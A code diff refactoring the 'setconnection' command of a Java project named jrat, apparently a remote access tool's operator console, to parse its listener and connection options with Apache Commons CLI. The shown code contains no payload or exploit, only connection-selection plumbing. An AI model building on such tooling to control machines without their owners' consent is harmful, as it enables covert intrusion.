@@ -1,22 +1,23 @@
 package net.jrat.core.command.commands;
 
+import org.apache.commons.cli.CommandLine;
+
 import net.jrat.core.command.Command;
 import net.jrat.core.connection.Connection;
 import net.jrat.core.listener.Listener;
-import net.jrat.utils.Formatter;
 import net.jrat.utils.Logger;
 
 public class SetConnection extends Command
 {
 	public SetConnection()
 	{
-		super("setconnection", new String[] { "-listener", "-connection" }, new String[] { "defines the listener by name", "defines the connection by username" }, "sets the current connection");
+		super("setconnection", new String[] { "listener", "connection" }, new String[] { "defines the listener by name", "defines the connection by username" }, "sets the current connection");
 	}
 	
 	@Override
-	public void execute(String[] arguments) throws Exception
+	public void execute(CommandLine commandLine) throws Exception
 	{
-		final String listenerName = Formatter.getValue(arguments, "-listener=").defaultTo(null);
+		final String listenerName = commandLine.getOptionValue("listener", null);
 		
 		if(listenerName == null)
 			throw new Exception("listener name is needed");
@@ -26,7 +27,7 @@ public class SetConnection extends Command
 		if(listener == null)
 			throw new Exception("listener not found");
 		
-		final String connectionUsername = Formatter.getValue(arguments, "-connection=").defaultTo(null);
+		final String connectionUsername = commandLine.getOptionValue("connection", null);
 		
 		if(connectionUsername == null)
 			throw new Exception("connection username needed");
